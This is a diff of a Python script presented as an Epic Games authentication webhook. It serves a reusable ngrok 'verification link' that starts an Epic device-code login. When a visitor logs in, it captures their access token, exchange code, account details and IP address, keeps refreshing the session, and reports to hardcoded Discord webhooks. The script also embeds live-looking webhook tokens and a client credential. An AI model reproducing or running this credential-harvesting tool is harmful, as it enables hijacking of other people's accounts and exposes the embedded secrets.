@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Epic Games Authentication Webhook Script.
+Epic Games Authentication Webhook Script (Self-Contained)
 This script creates a permanent ngrok link to authenticate with Epic Games and automatically refreshes tokens.
-- Last Updated: 2025-11-13 22:00:15
+- Last Updated: 2025-11-13 22:10:00
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -19,6 +19,14 @@ def run_setup():
     """Ensures all dependencies and ngrok are installed before starting."""
     print("--- Starting initial setup ---")
     
+    # Clean up old ngrok files to ensure a fresh install
+    if os.path.exists("ngrok"):
+        print("     Removing old ngrok executable for a clean setup.")
+        try:
+            os.remove("ngrok")
+        except OSError as e:
+            print(f"     Warning: Could not remove old ngrok file: {e}")
+
     if os.path.exists("requirements.txt"):
         try:
             print("1/3: Checking/installing Python dependencies...")
@@ -31,28 +39,25 @@ def run_setup():
         print("1/3: requirements.txt not found, skipping dependency installation.")
 
     ngrok_path = os.path.join(os.getcwd(), "ngrok")
-    if not os.path.exists(ngrok_path):
-        try:
-            print("2/3: Downloading and installing ngrok...")
-            machine, system = platform.machine().lower(), platform.system().lower()
-            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" # Default
-            if system == "linux" and ("aarch64" in machine or "arm64" in machine):
-                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
-            
-            with requests.get(ngrok_url, stream=True) as r:
-                r.raise_for_status()
-                with open("ngrok.zip", "wb") as f:
-                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
-            
-            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
-            os.remove("ngrok.zip")
-            os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
-            print("     ngrok installed successfully.")
-        except Exception as e:
-            print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
-            sys.exit(1)
-    else:
-        print("2/3: ngrok is already installed.")
+    try:
+        print("2/3: Downloading and installing ngrok...")
+        machine, system = platform.machine().lower(), platform.system().lower()
+        ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" # Default
+        if system == "linux" and ("aarch64" in machine or "arm64" in machine):
+            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
+        
+        with requests.get(ngrok_url, stream=True) as r:
+            r.raise_for_status()
+            with open("ngrok.zip", "wb") as f:
+                for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
+        
+        with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
+        os.remove("ngrok.zip")
+        os.chmod(ngrok_path, stat.S_IRWXU) # Set full executable permissions
+        print("     ngrok installed successfully.")
+    except Exception as e:
+        print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
+        sys.exit(1)
 
     authtoken = os.getenv("NGROK_AUTHTOKEN")
     if authtoken:
@@ -66,7 +71,6 @@ def run_setup():
         print("3/3: NGROK_AUTHTOKEN not set, skipping configuration.")
     print("--- Setup complete ---")
 
-run_setup()
 
 # --- MAIN APPLICATION IMPORTS ---
 import time
@@ -78,22 +82,17 @@ import http.server
 import socketserver
 import uuid
 import traceback
-
 import aiohttp
-import requests
 
 # ==============================================================================
-# --- SHARED CONFIGURATION AND GLOBALS ---
+# --- MAIN SCRIPT LOGIC ---
 # ==============================================================================
+
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("webhook_runner")
-
-# --- WEBHOOK-SPECIFIC CONFIG ---
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1438645878176092220/RAweu24YWlY1ljU9a0wNa774B8a4ig00SCI42J1yM0xpu0eUY4dHJsCVUsnzDdh5-cNB"
 DISCORD_UPDATES_WEBHOOK_URL = "https://discord.com/api/webhooks/1438645950959583375/KTdPTjVBrdYH9P5QMzlZnPT4xlIKmM6IvcOD_zQFjUILZb-C7M4VDL213-sAKxjFqJ9j"
-REFRESH_INTERVAL = 120 # seconds
-
-# --- SHARED GLOBALS ---
+REFRESH_INTERVAL = 120
 ngrok_url = None
 ngrok_ready = threading.Event()
 permanent_link = None
@@ -101,12 +100,8 @@ permanent_link_id = None
 verification_uses = 0
 active_sessions = {}
 session_lock = threading.Lock()
-
 main_event_loop = asyncio.new_event_loop()
 
-# ==============================================================================
-# --- EPIC AUTHENTICATION WEBHOOK LOGIC ---
-# ==============================================================================
 async def create_epic_auth_session():
     EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
     async with aiohttp.ClientSession() as sess:
@@ -177,11 +172,9 @@ async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_i
                         logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
                         async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2: exchange_data = await r2.json()
                         async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3: account_info = await r3.json()
-                        
                         session_id = str(uuid.uuid4())[:8]
                         with session_lock:
                             active_sessions[session_id] = {'access_token': token_resp['access_token'], 'exchange_code': exchange_data['code'], 'account_info': account_info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0}
-                        
                         asyncio.run_coroutine_threadsafe(send_login_success(session_id, account_info, exchange_data['code'], user_ip), main_event_loop)
                         asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id, token_resp['access_token'], account_info, user_ip), main_event_loop)
                         return
@@ -213,9 +206,6 @@ def send_webhook_startup_message(link):
     embed = {"title": "🚀 Epic Auth System Started", "description": f"System is online and ready!\n\n🔗 **Permanent Verification Link:**\n`{link}`\n\n🔄 Exchange codes will auto-refresh every 2 minutes\n📢 Updates will be sent to the muted channel", "color": 3447003, "fields": [{"name": "Status", "value": "✅ Online", "inline": True}, {"name": "Link Expiry", "value": "Never (reusable)", "inline": True}, {"name": "Auto-Refresh", "value": "Every 2 minutes", "inline": True}], "footer": {"text": "Users can use this link multiple times"}, "timestamp": datetime.utcnow().isoformat()}
     requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
 
-# ==============================================================================
-# --- WEB SERVER & NGROK ---
-# ==============================================================================
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         global verification_uses
@@ -235,9 +225,7 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             except Exception as e:
                 logger.error(f"❌ Error during auth session creation: {e}\n{traceback.format_exc()}"); self.send_error(500)
         else: self.send_error(404)
-
-    def log_message(self, format, *args):
-        pass
+    def log_message(self, format, *args): pass
 
 def run_web_server(port):
     with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
@@ -248,7 +236,6 @@ def setup_ngrok_tunnel(port):
     ngrok_executable = os.path.join(os.getcwd(), "ngrok")
     try:
         logger.info("🌐 Starting ngrok...")
-        # REMOVED the --domain parameter to allow ngrok to generate a random URL
         subprocess.Popen([ngrok_executable, 'http', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         for _ in range(60):
             time.sleep(1)
@@ -270,26 +257,19 @@ def setup_ngrok_tunnel(port):
     except Exception as e:
         logger.critical(f"❌ An exception occurred while setting up ngrok: {e}"); sys.exit(1)
 
-# ==============================================================================
-# --- MAIN EXECUTION ---
-# ==============================================================================
 def run_main_loop():
     asyncio.set_event_loop(main_event_loop)
     main_event_loop.run_forever()
 
 def start_app():
     logger.info("=" * 60 + "\n🚀 EPIC AUTH WEBHOOK SYSTEM STARTING\n" + "=" * 60)
-    
     threading.Thread(target=run_main_loop, daemon=True).start()
     threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
     threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
-
     if not ngrok_ready.wait(timeout=65):
         logger.critical("❌ Timed out waiting for ngrok to initialize. Exiting.")
         return
-
     logger.info("=" * 60 + f"\n✅ WEBHOOK READY | Link: {permanent_link}\n" + "=" * 60)
-    
     try:
         while True:
             time.sleep(1)
@@ -299,4 +279,6 @@ def start_app():
         sys.exit(0)
 
 if __name__ == "__main__":
+    # This now runs the setup first, then starts the main application.
+    run_setup()
     start_app()
